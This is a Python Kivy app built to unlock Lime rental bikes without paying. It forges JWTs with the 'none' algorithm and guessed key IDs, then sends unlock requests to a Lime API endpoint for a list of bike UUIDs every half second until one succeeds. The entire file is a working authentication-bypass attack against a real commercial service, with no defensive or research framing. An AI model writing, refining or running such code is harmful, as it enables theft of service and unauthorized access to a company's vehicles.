import httpx
import jwt
import time
import random
import string
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from concurrent.futures import ThreadPoolExecutor

FAST_BIKE_UUIDS = ["BK-A1B2C3D", "BK-X9Y8Z7W", "BK-P6O5I4U", "BK-Q2W3E4R"]
FAST_KIDS = ["old_rsa_key_v1", "fallback-null-001", "test-signing-key"]

def rand_str(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def forge_token(kid="old_rsa_key_v1"):
    header = {"alg": "none", "kid": kid}
    payload = {
        "sub": f"user_{rand_str(8)}",
        "scopes": ["unlock", "ride"],
        "iss": "lime-inc",
        "exp": int(time.time()) + 3600,
        "anonymous": True
    }
    try:
        return jwt.encode(header, payload, algorithm="none")
    except:
        return jwt.encode(payload, key="FAKE_KEY", algorithm="HS256")

class FastUnlockEngine:
    def __init__(self):
        self.base = "https://web-production.lime.bike/api/v5" 
        self.headers = {
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; A15 Build/...)",
            "X-App-Version": "5.40.0",
            "Content-Type": "application/json"
        }

    def attempt(self, bike_uuid, kid):
        forged_jwt = forge_token(kid)
        session_token = f"sess_{rand_str(10)}"
        headers = dict(self.headers, **{
            "Authorization": f"Bearer {forged_jwt}",
            "X-Session-Token": session_token
        })
        try:
            res = httpx.post(f"{self.base}/bike/unlock", json={"scooter_uuid": bike_uuid}, headers=headers, timeout=5)
            if res.status_code == 200 and ("unlocked" in res.text.lower() or "success" in res.text.lower()):
                return True, bike_uuid, res.text[:30]
            else:
                return False, bike_uuid, res.status_code
        except Exception as e:
            return False, bike_uuid, str(e)

class LimeUnlockerApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.btn = Button(text='Start Unlock', on_press=self.start)
        self.output = Label(text="Status: Waiting...")
        self.layout.add_widget(self.btn)
        self.layout.add_widget(self.output)
        return self.layout

    def start(self, *args):
        self.engine = FastUnlockEngine()
        self.output.text = "Starting unlock..."
        self.schedule = Clock.schedule_interval(self.spawn, 0.5)

    def spawn(self, dt):
        bike_uuid = random.choice(FAST_BIKE_UUIDS)
        kid = random.choice(FAST_KIDS)
        success, uuid, response = self.engine.attempt(bike_uuid, kid)
        if success:
            self.output.text = f"[+] ✅ Unlocked!\nUUID: {uuid}\nResponse: {response}"
            self.schedule.cancel()
        else:
            self.output.text = f"[-] Failed | {kid} | {response}"

LimeUnlockerApp().run()